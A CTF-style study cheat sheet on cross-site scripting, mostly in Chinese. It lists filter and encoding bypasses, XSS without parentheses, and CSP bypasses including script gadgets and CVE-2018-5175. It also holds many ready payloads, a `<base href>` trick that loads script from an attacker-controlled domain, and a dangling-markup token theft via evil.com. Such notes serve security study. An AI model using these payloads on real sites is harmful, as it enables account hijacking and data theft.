# Cross-Site Scripting  
1. reflected xss  
2. stored xss  
3. DOM xss: 最近の流行り  
Reflected 和 stored 都會經過後端，而DOM XSS完全在客戶端運行！  

# Bypass
* toUpperCase()  
  ```js
  İ (%c4%b0).toLowerCase() => i
  ı (%c4%b1).toUpperCase() => I
  ſ (%c5%bf) .toUpperCase() => S
  K (%E2%84%AA).toLowerCase() => k
  ```  
* 編碼 (parse the dangerous char  
  * url編碼: `% + ASCII(hex) %3Cscript%3E`  
  * http://www.jsfuck.com/  
  js func: `escape()/unescape()`, `encodeURL()/decodeURL()`, `encodeURLComponent()/decodeURLComponent()`  
  * html編碼
    ```php
    htmlspecialchars($_GET['hi']);  // no open html tag for you
    ```  
  * unicode編碼: `%u + ASCII(hex)` ASP, IIS 會自動解析unicode e.g. `<%s%cr%u0131pt>`  
  * `IBM037`,`IBM500`,`IBM1026`,`cp875` [Bypass RequestValidation on aspx]  
  * ascii編碼
    ```js
    eval(String.fromCharCode(97,108,101,114,116,40,49,41))
    // <script>alert(1)</script>
    ```
  [編碼工具](http://monyer.com/demo/monyerjs/)  
  String.fromCharCode() converts unicode to string [Manual](https://www.w3schools.com/jsref/jsref_fromCharCode.asp)  
  eval() run the js script [Manual](https://www.w3schools.com/jsref/jsref_eval.asp)  
* 用換行符`\n`繞過  
  ```js
  <img src="javas
  cript:
  alert(/1/);">
  ```  
* URL繞過 `.`, `//`  
  urlencode, dec  
  `\\` 繞過 `http://`  
  URL知識: 第一個 `/` 是用來區分schema和路徑的，第二個 `/` 則是路徑的一部分  
* htmlspecialchars繞過  
  php函數, 可以將 `&`,`'`,`"`,`<`,`>` 五種字元裝換成純字符。 需要注意的是他要配合第二個參數(`ENT_QUOTES`)才會過濾單引號。  
* 用注釋繞過  
  * 有些HTML解析器優先識別註釋而忽略內容  
    ```js
    <!--ignored<!--ignored--><script>alert(1)</script>-->
    // <script>alert(1)</script> 露出而執行
    ```  
  * 有些HTML解析器根本不識別註釋  
    ```js
    <!--<a href="--><img src=x onerror=alert(1)//">hi</a>
    // HTMLparser 解析成<a href="--><img src=x onerror=alert(1)//">hi</a> 
    ```  
  然而`<img src=x onerror=alert(1)>`露出而執行。  
* 從屬性下手  
  ```
  // type
  <input type="image" src=x onerror=alert(1)>
  ```  
* 用onerror繞過括號  
  利用onerror的xss很常見，throw則可以用來觸發error  
  throw會傳遞後面的參數給前面指定的函數  
  ```
  <script>onerror=alert;throw 1</script>
  <script>onerror=eval;throw'=alert\x281\x29'</script>
  // 上面用;區分語句，重點在於要區分！所以也可以使用{}來區分
  <script>{onerror=alert}throw 1</script>

  throw onerror=alert,123,'haha'
  {onerror=eval}throw{lineNumber:1,columnNumber:1,fileName:'second arg',message:'alert(1)'}
  TypeError.prototype.name = '=/',0[onerror=eval]['/-alert(1)//']
  ```  
  :one: 第一種在safari和IE上會pop 1，但是在chrome和opera上會在字首加上uncaught的字串。  
  :two: 第二種payload可以解決uncaught的問題，而`=`放在throw單引號裡的原因是：`"Uncaught=alert(1)"`作為字串參數送給了`eval`！chrome在字首加上了`Uncaught`，為了讓eval可以將其視為代碼而執行，payload才要接上`=code`。值得注意的是，這個payload在firefox上會執行失敗，原因是firefox的prefix是`uncaught exception`，這樣當然導致eval無法執行囉！    
  :four: 第四種會pop Uncaught haha。throw接受表達式，上面的payload先設定了一個error handler，然後表達式最後的部分會作為參數送給error handler。當然這個payload如果使用eval在firefox執行也會因為uncaught exception而出現error！  
  :five: 第五種payload是利用throw new Error的方式，他就不會有前面的uncaught exception (e.g. `throw new Error('alert(1)')`)，但是這就需要括號了！改用error原型的obj在`message`中傳入error handler的參數，甚至還可以在`fileName`中傳入handler的第二個參數！  
  :six: 第六種則是由＠Pepe Vila提出，甚至已經不需要throw，不過只能在chrome上使用。  
  [參考原文：XSS without parentheses and semi-colons](https://portswigger.net/blog/xss-without-parentheses-and-semi-colons)


[PHP過濾函數](https://blog.csdn.net/h1023417614/article/details/29560985)  

# XSS Auditor
[推：XSS Auditor](https://www.chromium.org/developers/design-documents/xss-auditor)  
XSS Auditor在html解析的階段尋找可能造成**reflected XSS**的攻擊向量。XSS Auditor只會檢查可執行的節點內容來避免過多false positive的狀況(e.g. `<textarea>`)。CTRL+U會顯示被視為惡意的內容。
```
// disable
X-XSS-Protection: 0

// Only filter the dangerous part
X-XSS-Protection: 1

// block the response and redirect to about:blank
X-XSS-Protection: 1; mode=block

// redirect report to the place you want
X-XSS-Protection: 1; mode=block; report=https://example.com/log.cgi
X-XSS-Protection: 1; report="https://example.com/log.cgi?jsessionid=132;abc"
```  

繞過思路：若頁面中有多個參數內容可控，可以透過組合試著繞過XSS auditor。使用js的template literal可以將兩個參數間的多行內容全部化為純文字！  

Auditor reference:  
* Source code  
[xss_auditor.h](https://cs.chromium.org/chromium/src/third_party/blink/renderer/core/html/parser/xss_auditor.h)  
[xss_auditor_delegate.h](https://cs.chromium.org/chromium/src/third_party/blink/renderer/core/html/parser/xss_auditor_delegate.h)

# CSP
[Content Security Policy Level 3](https://www.w3.org/TR/CSP/)    
* 如何看CSP是否作用於當前頁面？  
  ```php
  curl -I https://github.com/
  ```  

* nonce script CSP  
  js元素必須符合後端產生的隨機數nonce才能執行  
  **Sebastian Lekies**用**DOM XSS**繞過因為DOM XSS不需要經過後端！   
  [如何通過DOM XSS來繞過nonce script 🎅](http://sirdarckcat.blogspot.jp/2016/12/how-to-bypass-csp-nonces-with-dom-xss.html)  
  思路：頁面若有緩存就不會再向後台請求頁面了！  
  e.g. `location.hash` 不會經過後端，所以nonce也就不會更新了！  
* strict-dynamic  
  如今各種框架中都支援動態產生javascript，然而沒有nonce怎麼辦呢？SD提供在沒有nonce的情況下也可以執行javascript。使用關鍵詞來允許非解析型腳本(**non parser-inserted script**)執行！  
  受信任的腳本所產生的腳本也是可信的！  
  ```js
  <!-- a.js -->
  // the source can be loaded
  var script = document.createElement('script');
  script.src = 'test.com/dependency.js';
  document.body.appendChild(script);
  // the source cannot be loaded
  document.write("<scr"+"ipt src='test.com/dependency.js'></scr"+"ipt>");
  ```
  透過`createElement`，元素為non parser-inserted。透過`document.write`，元素為parser-inserted。  

  :cat2:**Script Gadgets**：  
  [security-research-pocs by Google](https://github.com/google/security-research-pocs/tree/master/script-gadgets)  
  ```js
  // bypass with require.js
  Content-Security-Policy: "default-src='none';script-src 'nonce-random' 'strict-dynamic'"
  <script data-main="data:,alert(1)"></script>
  <script nonce="random" src="require.js"></script>
  // Reason：require.js will find the script with attribute of data-main and load it like following
  var node = document.createElement('script');
  node.src = 'data:,alert(1)';
  document.head.appendChild(node);
  ```  
  它在找到`data-main`後，會以createElement的方式加載，因此能繞過nonce。參考[XSS學習筆記](https://blog.1pwnch.com/ctf/websecurity/2018/06/15/XSS-Interest-Until-Death/)SD部分。  

  :cat2:**CVE-2018-5175** (Bypass strict-dynamic with add-on)：  
  [Browser Extensions
](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions)  
  legacy-extension就是那些過去以XUL/XPCOM為基礎所建造的擴充，雖然2017/11後基礎已改為Web-extensions，但瀏覽器內部至今還多使用這個機制  
  這裡我們必須了解`manifest`下的`web_accessible_resources`(webextension)以及`contentaccessible flag`(legacy extension)，被這個`url contentaccessible=yes`的resource可以從任何頁面載入，這裡就有個弊端了，**任何頁面載入並且不需要nonce允許**！  
  ```json
  ....
  resource devtools devtools/modules/devtools/
  resource devtools-client-jsonview resouce://devtools/client/jsonview/ contentaccessible=yes
  ....
  ```
  上面是firefox extension下`manifest`的一部分，可以知道`resource://devtools`下面的file都可以從任何頁面載入而不需要nonce的允許，而`resource://devtools/client/jsonview/lib/require.js`也不例外。  
  ```js
  <!-- exploit -->
  csp: strict-dynamic...

  <script data-main="data:,alert(1)"></script>
  <script src="resource://devtools-client-jsonview/lib/require.js"></script>
  ```
  所以我們不需要nonce也能讓`require.js`載入執行，靠script-gadget中提到`require.js`尋找`data-main`屬性，不難理解這個xss的攻擊就會成功bypass csp了！  

  若不是框架中帶有的script-gadget，就從開發者的code中自己找一個，以下為思路：  
  某段script中將`attribute`的值插入`innerHTML`;  

推薦工具：  
[CSP Evaluator](https://csp-evaluator.withgoogle.com/)  
[ChromePlugin-CSP Mitigator](https://chrome.google.com/webstore/detail/csp-mitigator/gijlobangojajlbodabkpjpheeeokhfa)  
推薦閱讀：    
[LoRexxar前端防御从入门到弃坑](https://lorexxar.cn/2017/10/25/csp-paper/)  
[CVE-2018-5175:Universal CSP strict-dynamic bypass in Firefox](https://mksben.l0.cm/2018/05/cve-2018-5175-firefox-csp-strict-dynamic-bypass.html)    
[迅速查表CSP cheatsheet](http://dogewatch.github.io/2016/12/08/By-Pass-CSP/)

# CTF中出現的奇技淫巧  
* 利用各種不同的html tag  
  ```js
  // script
  <script>a=prompt;a(1)</script>

  // img
  <img src=1 onmouseover=alert(1)>
  <img src=1 onerror=confirm(1)>
  <img src="javascript:alert(1);">

  // svg
  <svg/onload=alert(1)>

  // body
  <body/onload=javascript:window.onerror=eval;throw=alert\x281\x29’;>  
  ```
* DOM based XSS  
  ```js
  <script>document.getElementById("contents").innerHTML=location.hash.substring(1);</script>
  // the data after hash won't be sent to the server side
  ```
* bootstrap data-* 屬性  
  ```js
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
  <script src="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js"></script>
  <button data-toggle="collapse" data-target="<img src=x onerror=alert(0)>">Test</button>

  // 關於這個漏洞的解釋issue中有一個評論很清楚
  <button data-toggle="collapse" data-target="<?=htmlspecialchars($_GET['x']);?>">Test</button>
  // 雖然有參數可控但是htmlspecialchar轉義，這本該是安全的，但是會在bootstrap環境下data-target的屬性中觸發
  ```  
  值得注意的是`data-target`本身不會造成xss漏洞，而是被帶到boostrap的環境下發揮效用的！  
[XSS in data-target attribute #20184](https://github.com/twbs/bootstrap/issues/20184)  
* `<base>` overwrites the js in relative path  
This is what I learned in RCTF-2018, CSP doesn't limit `base-uri` cause to `<base>` bypass, and there are also relative js imported from outside, now we can forge a js which is able to ignore the CSP rules.  
**Exploit**:  
:point_down: insert `<base href="http://controlled_domain/">`  
:point_down: imported `/assets/jquery.min.js` becomes `http://controlled_domain/assets/jquery.min.js`  
:point_down: `controlled_domain/assets/jquery.min.js` can be inserted with `location.href=url;`  
:point_down: when we visit the page inserted with `<base>`, we will be redirect to `url`!  
More details: [rblog-writeup](https://github.com/shinmao/CTF-writeups/tree/master/RCTF2018)  
* `<base target>` steal the content of pages(token)  
Also use the tag of `<base>` but the concept is different  
**Exploit**:  
:point_down: insert an uncompleted `<base target>` to the page  
:point_down: `target` makes all URL's page[http://evil.com/](http://evil.com/)in current page have a same `window.name`!  
:point_down: page of [http://evil.com/](http://evil.com/) has `<script>alert(name);</script>`  
:point_down: the content of pop block is the name of the target  
[reference](https://portswigger.net/blog/evading-csp-with-dom-based-dangling-markup)  

# Cheatsheet
[Brute XSS payload by Pgaijin66](https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt)  
[PayloadAllTheThings by swisskyrepo](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection)  

# An interesting feature related to Transfer-Encoding
If POST request includeds header of `Transfer-Encoding: chunked`, the data stream would be responded to client without any changes. This causes to the malicious content such like XSS.(Has been patched in the lastest version)  
[XSS due to the header Transfer-Encoding: chunked](https://bugs.php.net/bug.php?id=76582)